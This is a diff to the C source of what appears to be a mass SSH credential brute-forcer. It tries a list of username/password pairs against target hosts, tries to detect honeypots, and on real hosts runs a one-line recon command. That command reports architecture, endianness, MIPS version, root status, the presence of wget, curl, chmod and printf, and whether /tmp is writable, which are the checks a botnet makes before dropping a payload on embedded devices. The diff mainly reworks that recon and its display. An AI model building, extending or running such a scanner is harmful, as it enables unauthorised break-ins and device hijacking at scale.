@@ -41,33 +41,7 @@
 #define SHOW_CURSOR "\033[?25h"
 
 #define SYSINFO \
-    "B=/bin/busybox;" \
-    "[ -f $B ]&&B_PATH=$B||B_PATH=$(which busybox 2>/dev/null);" \
-    "A=$(uname -m);" \
-    "E=Unknown;" \
-    "if command -v python3>/dev/null 2>&1;then " \
-      "E=$(python3 -c 'import sys;print(sys.byteorder.capitalize())');" \
-    "elif command -v python>/dev/null 2>&1;then " \
-      "E=$(python -c 'import sys;print sys.byteorder.capitalize()');" \
-    "elif command -v od>/dev/null 2>&1;then " \
-      "E=$(echo -n I|od -to2|head -1|awk '{print $2}'|grep -q '000111'&&echo Little||echo Big);" \
-    "elif command -v hexdump>/dev/null 2>&1;then " \
-      "E=$(printf '\\001'|hexdump -e '1/1 \"%d\"' 2>/dev/null|grep -q '1'&&echo Little||echo Big);" \
-    "elif [ -n \"$B_PATH\" ];then " \
-      "E=$($B_PATH printf '\\001'|$B_PATH hexdump -e '1/1 \"%d\"' 2>/dev/null|grep -q '1'&&echo Little||echo Big);" \
-    "fi;" \
-    "if [ -f /etc/os-release ]||[ -f /etc/debian_version ];then T=Linux-Standard;else T=BusyBox;fi;" \
-    "[ -f /bin/wget ]||[ -f /usr/bin/wget ]&&W=YES||W=NO;" \
-    "[ -f /bin/curl ]||[ -f /usr/bin/curl ]&&K=YES||K=NO;" \
-    "[ -w /tmp ]&&P=YES||P=NO;" \
-    "[ \"$(id -u)\" = \"0\" ]&&R=YES||R=NO;" \
-    "if [ -f /bin/chmod ]||[ -f /usr/bin/chmod ];then C=YES;" \
-    "elif [ -n \"$B_PATH\" ]&&$B_PATH chmod --help>/dev/null 2>&1;then C=YES;" \
-    "else C=NO;fi;" \
-    "if [ -f /bin/printf ]||[ -f /usr/bin/printf ];then F=YES;" \
-    "elif [ -n \"$B_PATH\" ]&&$B_PATH printf --help>/dev/null 2>&1;then F=YES;" \
-    "else F=NO;fi;" \
-    "echo \"TYPE:$T|ARCH:$A|ENDIAN:$E|WGET:$W|CURL:$K|TMP:$P|ROOT:$R|CHMOD:$C|PRINTF:$F\""
+    "a=$(uname -m);echo \"$a|$(id -u)|$(case $a in *l|*el|x86*|i?86|amd64|aarch64)echo LE;;*)echo BE;;esac)|$(grep -oE mips3. /proc/cpuinfo 2>/dev/null||echo -)|$(which wget 2>/dev/null)|$(which curl 2>/dev/null)|$(which printf 2>/dev/null)|$(which chmod 2>/dev/null)|$([ -w /tmp ]&&echo W||echo N)\""
 
 #define AUTH_PER_CONN 100
 
@@ -268,6 +242,15 @@ typedef struct {
     char user[32];
     char pass[32];
     int hp;
+    char arch[32];
+    char endian[4];
+    char mips_ver[16];
+    int uid;
+    int has_wget;
+    int has_curl;
+    int has_printf;
+    int has_chmod;
+    int tmp_writable;
     char info[512];
 } Result;
 
@@ -451,36 +434,77 @@ static int check_hp(rawssh_session *s) {
     return 1;
 }
 
-static void get_info(rawssh_session *s, char *out, int sz) {
-    char buf[1024] = {0};
-    ssh_exec_cmd(s, SYSINFO, buf, sizeof(buf));
-    /* strip newlines and extra spaces */
+static void parse_sysinfo(const char *raw, Result *r) {
+    char buf[1024];
+    strncpy(buf, raw, sizeof(buf) - 1);
+    buf[sizeof(buf) - 1] = 0;
+
     for (int i = 0; buf[i]; i++) {
         if (buf[i] == '\n' || buf[i] == '\r')
-            buf[i] = ' ';
+            buf[i] = 0;
     }
-    /* find the TYPE: output line */
-    char *start = strstr(buf, "TYPE:");
-    if (start) {
-        char *d = out;
-        char *p = start;
-        while (*p && *p != '\n' && (d - out < sz - 1)) {
-            /* skip extra spaces */
-            if (*p == ' ' && *(p + 1) == ' ') { p++; continue; }
-            *d++ = *p++;
-        }
-        *d = 0;
-    } else {
-        /* fallback: copy raw output */
-        char *d = out;
-        char *p = buf;
-        while (*p) {
-            while (*p == ' ' && *(p + 1) == ' ') p++;
-            if (d - out < sz - 1) *d++ = *p;
+
+    char *fields[9] = {0};
+    int fc = 0;
+    char *p = buf;
+
+    while (*p && ((unsigned char)*p <= 0x20))
+        p++;
+
+    fields[fc++] = p;
+    while (*p && fc < 9) {
+        if (*p == '|') {
+            *p = 0;
+            p++;
+            fields[fc++] = p;
+        } else {
             p++;
         }
-        *d = 0;
     }
+
+    if (fc >= 1)
+        strncpy(r->arch, fields[0], sizeof(r->arch) - 1);
+
+    if (fc >= 2)
+        r->uid = atoi(fields[1]);
+
+    if (fc >= 3)
+        strncpy(r->endian, fields[2], sizeof(r->endian) - 1);
+
+    if (fc >= 4)
+        strncpy(r->mips_ver, fields[3], sizeof(r->mips_ver) - 1);
+
+    if (fc >= 5)
+        r->has_wget = (fields[4][0] && fields[4][0] != '\0' && strcmp(fields[4], "") != 0) ? 1 : 0;
+
+    if (fc >= 6)
+        r->has_curl = (fields[5][0] && strcmp(fields[5], "") != 0) ? 1 : 0;
+
+    if (fc >= 7)
+        r->has_printf = (fields[6][0] && strcmp(fields[6], "") != 0) ? 1 : 0;
+
+    if (fc >= 8)
+        r->has_chmod = (fields[7][0] && strcmp(fields[7], "") != 0) ? 1 : 0;
+
+    if (fc >= 9)
+        r->tmp_writable = (fields[8][0] == 'W') ? 1 : 0;
+
+    snprintf(r->info, sizeof(r->info), "ARCH:%s|UID:%d|ENDIAN:%s|MIPS:%s|WGET:%s|CURL:%s|PRINTF:%s|CHMOD:%s|TMP:%s",
+             r->arch,
+             r->uid,
+             r->endian,
+             r->mips_ver,
+             r->has_wget ? "YES" : "NO",
+             r->has_curl ? "YES" : "NO",
+             r->has_printf ? "YES" : "NO",
+             r->has_chmod ? "YES" : "NO",
+             r->tmp_writable ? "YES" : "NO");
+}
+
+static void get_info(rawssh_session *s, Result *r) {
+    char buf[1024] = {0};
+    ssh_exec_cmd(s, SYSINFO, buf, sizeof(buf));
+    parse_sysinfo(buf, r);
 }
 
 static void save_result(Result *r) {
@@ -575,8 +599,6 @@ static void process(int idx) {
     Target *t = &g_targets[idx];
     atomic_fetch_add(&G_active, 1);
 
-    unsigned int rng_seed = (unsigned int)(idx ^ time(NULL) ^ (uintptr_t)pthread_self());
-
     sem_wait(&g_sem);
 
     rawssh_session *ses = open_session(t->ip, t->port);
@@ -611,19 +633,23 @@ static void process(int idx) {
         if (rc == RAWSSH_OK) {
             atomic_fetch_add(&G_found, 1);
             int hp = check_hp(ses);
-            char info[512] = {0};
+            Result r = {.port = t->port, .hp = hp, .uid = -1, .has_wget = 0,
+                        .has_curl = 0, .has_printf = 0, .has_chmod = 0, .tmp_writable = 0};
+            strncpy(r.ip, t->ip, 47);
+            strncpy(r.user, CREDS[combo].u, 31);
+            strncpy(r.pass, CREDS[combo].p, 31);
+            memset(r.arch, 0, sizeof(r.arch));
+            memset(r.endian, 0, sizeof(r.endian));
+            memset(r.mips_ver, 0, sizeof(r.mips_ver));
+            memset(r.info, 0, sizeof(r.info));
+
             if (hp == 0)
-                get_info(ses, info, 511);
+                get_info(ses, &r);
             if (hp == 1)
                 atomic_fetch_add(&G_hp, 1);
             else
                 atomic_fetch_add(&G_real, 1);
 
-            Result r = {.port = t->port, .hp = hp};
-            strncpy(r.ip, t->ip, 47);
-            strncpy(r.user, CREDS[combo].u, 31);
-            strncpy(r.pass, CREDS[combo].p, 31);
-            strncpy(r.info, info, 511);
             save_result(&r);
 
             close_session(ses);
@@ -652,7 +678,7 @@ static void process(int idx) {
             } else {
                 errs = 0;
             }
-            
+
             ses = open_session(t->ip, t->port);
             if (!ses) {
                 sem_post(&g_sem);
@@ -747,46 +773,28 @@ static void draw() {
         printf("  %s%s%s %s:%d %s%s%s:%s%s%s\n",
                col, tag, C_RESET, r->ip, r->port,
                C_WHITE, r->user, C_RESET, C_YELLOW, r->pass, C_RESET);
-        if (r->hp == 0 && r->info[0]) {
-            /* Parse and display recon fields with colors */
-            char tmp[512];
-            strncpy(tmp, r->info, 511); tmp[511] = 0;
-            char *type_v = NULL, *arch_v = NULL, *end_v = NULL;
-            char *wget_v = NULL, *curl_v = NULL, *tmp_v = NULL;
-            char *root_v = NULL, *chmod_v = NULL, *printf_v = NULL;
-            char *saveptr = NULL;
-            char *tok = strtok_r(tmp, "|", &saveptr);
-            while (tok) {
-                while (*tok == ' ') tok++;
-                if (strncmp(tok, "TYPE:", 5) == 0) type_v = tok + 5;
-                else if (strncmp(tok, "ARCH:", 5) == 0) arch_v = tok + 5;
-                else if (strncmp(tok, "ENDIAN:", 7) == 0) end_v = tok + 7;
-                else if (strncmp(tok, "WGET:", 5) == 0) wget_v = tok + 5;
-                else if (strncmp(tok, "CURL:", 5) == 0) curl_v = tok + 5;
-                else if (strncmp(tok, "TMP:", 4) == 0) tmp_v = tok + 4;
-                else if (strncmp(tok, "ROOT:", 5) == 0) root_v = tok + 5;
-                else if (strncmp(tok, "CHMOD:", 6) == 0) chmod_v = tok + 6;
-                else if (strncmp(tok, "PRINTF:", 7) == 0) printf_v = tok + 7;
-                tok = strtok_r(NULL, "|", &saveptr);
-            }
-            if (type_v && arch_v) {
-                #define YN(v) ((v) && strcmp((v),"YES")==0 ? C_GREEN : C_RED), \
-                               ((v) ? (v) : "?"), C_RESET
-                printf("       %s%s%s %s%s%s",
-                       C_CYAN, type_v ? type_v : "?", C_RESET,
-                       C_WHITE, arch_v ? arch_v : "?", C_RESET);
-                printf(" %s%s%s", C_GRAY, end_v ? end_v : "?", C_RESET);
-                printf(" W:%s%s%s", YN(wget_v));
-                printf(" C:%s%s%s", YN(curl_v));
-                printf(" T:%s%s%s", YN(tmp_v));
-                printf(" R:%s%s%s", YN(root_v));
-                printf(" CH:%s%s%s", YN(chmod_v));
-                printf(" PF:%s%s%s", YN(printf_v));
-                printf("\n");
-                #undef YN
-            } else {
-                printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
-            }
+        if (r->hp == 0 && r->arch[0]) {
+            #define YN_COL(v) ((v) ? C_GREEN : C_RED)
+            #define YN_STR(v) ((v) ? "YES" : "NO")
+            printf("       %s%s%s %s%s%s",
+                   C_CYAN, r->arch, C_RESET,
+                   C_GRAY, r->endian, C_RESET);
+            if (r->mips_ver[0] && strcmp(r->mips_ver, "-") != 0)
+                printf(" %s%s%s", C_WHITE, r->mips_ver, C_RESET);
+            printf(" R:%s%s%s",
+                   r->uid == 0 ? C_GREEN : C_RED,
+                   r->uid == 0 ? "YES" : "NO",
+                   C_RESET);
+            printf(" W:%s%s%s", YN_COL(r->has_wget), YN_STR(r->has_wget), C_RESET);
+            printf(" C:%s%s%s", YN_COL(r->has_curl), YN_STR(r->has_curl), C_RESET);
+            printf(" T:%s%s%s", YN_COL(r->tmp_writable), YN_STR(r->tmp_writable), C_RESET);
+            printf(" CH:%s%s%s", YN_COL(r->has_chmod), YN_STR(r->has_chmod), C_RESET);
+            printf(" PF:%s%s%s", YN_COL(r->has_printf), YN_STR(r->has_printf), C_RESET);
+            printf("\n");
+            #undef YN_COL
+            #undef YN_STR
+        } else if (r->hp == 0 && r->info[0]) {
+            printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
         }
     }
     pthread_mutex_unlock(&g_resmtx);
